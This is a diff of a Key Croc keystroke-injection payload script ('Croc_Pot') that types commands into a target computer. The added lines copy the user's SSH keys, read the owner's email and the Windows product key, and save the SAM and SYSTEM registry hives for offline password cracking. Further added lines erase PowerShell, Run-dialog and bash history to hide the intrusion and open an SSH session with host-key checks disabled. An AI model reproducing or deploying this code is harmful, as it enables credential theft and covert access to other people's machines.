@@ -3,12 +3,12 @@
 #                This will collect some data off target (ip address, current user name, target host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.4.3
+# Version:       1.4.4
 # Category:      Key Croc
 
 MATCH crocpot
 
-#---> Edit KEYCROC_PASSWD_HERE
+#---> Edit KEYCROC_PASSWD_BELOW
 CROC_PW=hak5croc
 
 #---> Check for target saved passwd, run Croc_Unlock payload first if not edit below
@@ -26,8 +26,8 @@ CROC_POT_DIR=(/root/udisk/tools/Croc_Pot /root/udisk/loot/Croc_Pot)
 for dir in "${CROC_POT_DIR[@]}"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done
 
 #---> remove existing OS detection
-rm ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt
-rm ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt
+rm ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[1]}/sam ${CROC_POT_DIR[1]}/system
+rm ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/target_email.txt
 
 #---> Enter ethernet mode for OS detection
 ATTACKMODE AUTO_ETHERNET
@@ -105,10 +105,19 @@ WINDOWS)
 	Q ENTER ; Q DELAY 2000
 	#---> Retrieve target .ssh file save to /loot/Croc_Pot/SSH
 	Q STRING "if ( (Test-Path -path ~/.ssh) -eq \$True ) { Copy-Item -Path ~/.ssh\* -Destination \"\$MOUNT_POINT\loot\Croc_Pot\SSH\" } else {\$false}"
-	Q ENTER
+	Q ENTER ; Q DELAY 2000
+	#---> Retrieve target E-mail, Unreliable
+	Q STRING "\$TARGET_EMAIL = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -Last 1 | Select-Object -ExpandProperty PrimaryOwnerName; if (-not \$TARGET_EMAIL) {\$TARGET_EMAIL = (Get-WmiObject -Class \"Win32_OperatingSystem\").RegisteredUser}; if (\$TARGET_EMAIL -match '^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})\$') {\"\$TARGET_EMAIL\" | out-file -encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\target_email.txt\"}"
+	Q ENTER ; Q DELAY 2000
+	#---> Retrieve target, windows product key
+	Q STRING "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey | out-file -encoding UTF8 \"\$MOUNT_POINT\loot\Croc_Pot\Windows_ProductKey.txt\""
+	Q ENTER ; Q DELAY 3000
+	#---> Retrieve target registry hives
+	Q STRING "reg save HKLM\SAM \$MOUNT_POINT\loot\Croc_Pot\sam ; reg save HKLM\SYSTEM \$MOUNT_POINT\loot\Croc_Pot\system"
+	Q ENTER ; Q DELAY 5000
 	#---> sed to remove powershell output first "?" character, "\r" endlines, replace "-" with ":"
-	sed -i '0,/./s/^.//' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt
-	sed -i 's/\r//g' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt
+	sed -i '0,/./s/^.//' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/target_email.txt
+	sed -i 's/\r//g' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/target_email.txt
 	sed -i 's/-/:/g' ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt
 ;;
 MACOS)
@@ -336,6 +345,25 @@ else
 	Q DELAY 1000
 fi
 Q ENTER
+
+#---> Check target history and clear history
+if [ "$TARGET_OS" = "WINDOWS" ]; then
+	Q STRING "Get-PnpDevice -Class \"Keyboard\" | Where-Object {\$_.Status -eq \"OK\" -and \$_.ClassGuid -eq \"{4d36e96b-e325-11ce-bfc1-08002be10318}\"} | Select-Object *"
+	Q ENTER ; Q DELAY 3000
+	Q STRING "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'"
+	Q ENTER ; Q DELAY 2000
+	Q STRING "Get-Content \"\$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt\""
+	Q ENTER ; Q DELAY 2000
+	Q STRING "Clear-History ; Remove-Item \"\$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt\""
+	Q ENTER ; Q DELAY 2000
+elif [ "$TARGET_OS" = "LINUX" ]; then
+	Q STRING "dmesg | grep \"usb.*RNDIS/Ethernet Gadget\|Keyboard\|usb-storage\""
+	Q ENTER ; Q DELAY 3000
+	Q STRING "history -n 500 ; history"
+	Q ENTER ; Q DELAY 2000
+	Q STRING "history -c ; rm ~/.bash_history"
+	Q ENTER ; Q DELAY 2000
+fi
 
 #---> Start SSH session with target
 Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6-)"
